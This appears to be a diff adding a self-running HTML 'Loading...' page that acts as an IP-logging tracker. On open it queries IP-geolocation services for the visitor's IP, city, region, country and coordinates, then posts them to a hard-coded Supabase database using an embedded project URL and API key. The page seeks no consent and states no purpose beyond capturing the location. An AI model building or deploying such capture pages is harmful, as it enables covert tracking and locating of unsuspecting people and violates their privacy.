@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loading...</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #0d1117; color: #e6edf3;
+      min-height: 100vh;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      padding: 24px 16px; text-align: center;
+    }
+    .spinner-wrap {
+      width: 70px; height: 70px;
+      border: 3px solid #30363d; border-top-color: #3fb950;
+      border-radius: 50%; animation: spin 0.8s linear infinite;
+      margin: 0 auto 24px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h1 { font-size: 1.2rem; font-weight: 600; margin-bottom: 8px; }
+    p  { font-size: 0.88rem; color: #8b949e; line-height: 1.5; max-width: 280px; }
+    .check {
+      width: 70px; height: 70px;
+      background: rgba(35,134,54,0.15); border: 2px solid #238636;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px; animation: pop 0.3s ease;
+    }
+    @keyframes pop { from { transform: scale(0.7); opacity:0; } to { transform:scale(1); opacity:1; } }
+    .info-box {
+      background: #161b22; border: 1px solid #30363d;
+      border-radius: 12px; padding: 16px 20px;
+      margin-top: 16px; width: 100%; max-width: 320px; text-align: left;
+    }
+    .row {
+      display: flex; justify-content: space-between;
+      padding: 6px 0; border-bottom: 1px solid #21262d; font-size: 0.83rem;
+    }
+    .row:last-child { border-bottom: none; }
+    .lbl { color: #8b949e; }
+    .val { color: #e6edf3; font-weight: 500; }
+    .x-circle {
+      width: 70px; height: 70px;
+      background: rgba(218,54,51,0.12); border: 2px solid #da3633;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+    }
+    .retry-btn {
+      margin-top: 16px; padding: 10px 24px;
+      background: #238636; color: #fff; border: none;
+      border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer;
+    }
+    .retry-btn:hover { background: #2ea043; }
+    .db-badge {
+      display: inline-flex; align-items: center; gap: 5px;
+      margin-top: 12px; padding: 5px 12px;
+      background: rgba(63,185,80,0.1); border: 1px solid rgba(63,185,80,0.3);
+      border-radius: 20px; font-size: 0.75rem; color: #3fb950;
+    }
+    .db-badge.fail {
+      background: rgba(218,54,51,0.1); border-color: rgba(218,54,51,0.3); color: #f85149;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- LOADING -->
+  <div id="loading-view">
+    <div class="spinner-wrap"></div>
+    <h1>Detecting location…</h1>
+    <p>Please wait a moment</p>
+  </div>
+
+  <!-- SUCCESS -->
+  <div id="done-view" style="display:none;flex-direction:column;align-items:center;">
+    <div class="check">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+    </div>
+    <h1>Location Captured ✓</h1>
+    <p style="color:#8b949e;font-size:0.85rem;margin-top:6px;">Recorded automatically.</p>
+    <div class="info-box">
+      <div class="row"><span class="lbl">City</span><span class="val" id="r-city">—</span></div>
+      <div class="row"><span class="lbl">Region</span><span class="val" id="r-region">—</span></div>
+      <div class="row"><span class="lbl">Country</span><span class="val" id="r-country">—</span></div>
+      <div class="row"><span class="lbl">IP</span><span class="val" id="r-ip">—</span></div>
+      <div class="row"><span class="lbl">Coords</span><span class="val" id="r-coords">—</span></div>
+      <div class="row"><span class="lbl">Time</span><span class="val" id="r-time">—</span></div>
+    </div>
+    <div id="db-status" class="db-badge" style="display:none"></div>
+  </div>
+
+  <!-- ERROR -->
+  <div id="error-view" style="display:none;flex-direction:column;align-items:center;">
+    <div class="x-circle">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
+      </svg>
+    </div>
+    <h1>Could not detect</h1>
+    <p id="err-msg">Check internet connection and try again.</p>
+    <button class="retry-btn" onclick="detect()">Try Again</button>
+  </div>
+
+<script>
+  // ═══════════════════════════════════════════════
+  //   SUPABASE CONFIG — paste your values here
+  // ═══════════════════════════════════════════════
+  const SUPABASE_URL    = 'https://yawimsrirltytzzqhtpu.supabase.co';   // e.g. https://abcxyz.supabase.co
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlhd2ltc3Jpcmx0eXR6enFodHB1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE1OTQ2NDIsImV4cCI6MjA5NzE3MDY0Mn0.z9SQHP_3u1TXiBkmJhmpT6x5pZ2DfV-1rCcPou8Fqqg';               // from Settings > API
+  const TABLE_NAME      = 'locations';                           // your table name
+  // ═══════════════════════════════════════════════
+
+  // 3 fallback IP APIs
+  const APIS = [
+    async () => {
+      const r = await fetch('https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,query');
+      const d = await r.json();
+      if (d.status !== 'success') throw new Error(d.message);
+      return { ip: d.query, city: d.city, region: d.regionName, country: d.country, lat: d.lat, lng: d.lon };
+    },
+    async () => {
+      const r = await fetch('https://ipwho.is/');
+      const d = await r.json();
+      if (!d.success) throw new Error(d.message);
+      return { ip: d.ip, city: d.city, region: d.region, country: d.country, lat: d.latitude, lng: d.longitude };
+    },
+    async () => {
+      const r = await fetch('https://freeipapi.com/api/json');
+      const d = await r.json();
+      return { ip: d.ipAddress, city: d.cityName, region: d.regionName, country: d.countryName, lat: d.latitude, lng: d.longitude };
+    }
+  ];
+
+  async function saveToSupabase(entry) {
+    const dbBadge = document.getElementById('db-status');
+    dbBadge.style.display = 'inline-flex';
+    dbBadge.textContent = '⏳ Saving to database…';
+
+    try {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
+        method : 'POST',
+        headers: {
+          'Content-Type' : 'application/json',
+          'apikey'       : SUPABASE_ANON_KEY,
+          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+          'Prefer'       : 'return=minimal'
+        },
+        body: JSON.stringify({
+          ip        : entry.ip,
+          city      : entry.city,
+          region    : entry.region,
+          country   : entry.country,
+          latitude  : entry.lat,
+          longitude : entry.lng,
+          captured_at: new Date().toISOString()
+        })
+      });
+
+      if (!res.ok) {
+        const err = await res.json();
+        throw new Error(err.message || res.statusText);
+      }
+
+      dbBadge.textContent = '✅ Saved to Supabase';
+    } catch (e) {
+      dbBadge.className = 'db-badge fail';
+      dbBadge.textContent = '⚠️ DB save failed: ' + e.message;
+      console.error('Supabase error:', e);
+    }
+  }
+
+  async function detect() {
+    show('loading-view');
+
+    for (const api of APIS) {
+      try {
+        const entry = await api();
+        entry.time = new Date().toLocaleString();
+
+        // Fill UI
+        document.getElementById('r-city').textContent    = entry.city    || '—';
+        document.getElementById('r-region').textContent  = entry.region  || '—';
+        document.getElementById('r-country').textContent = entry.country || '—';
+        document.getElementById('r-ip').textContent      = entry.ip      || '—';
+        document.getElementById('r-coords').textContent  = `${entry.lat}, ${entry.lng}`;
+        document.getElementById('r-time').textContent    = entry.time;
+        document.title = `📍 ${entry.city}, ${entry.country}`;
+
+        // Save to Supabase
+        show('done-view');
+        await saveToSupabase(entry);
+        return;
+
+      } catch (e) { /* try next API */ }
+    }
+
+    document.getElementById('err-msg').textContent = 'All location services failed. Try again later.';
+    show('error-view');
+  }
+
+  function show(id) {
+    ['loading-view','done-view','error-view'].forEach(v => {
+      document.getElementById(v).style.display = 'none';
+    });
+    document.getElementById(id).style.display = 'flex';
+  }
+
+  detect(); // auto-run on page open
+</script>
+</body>
+</html>
+
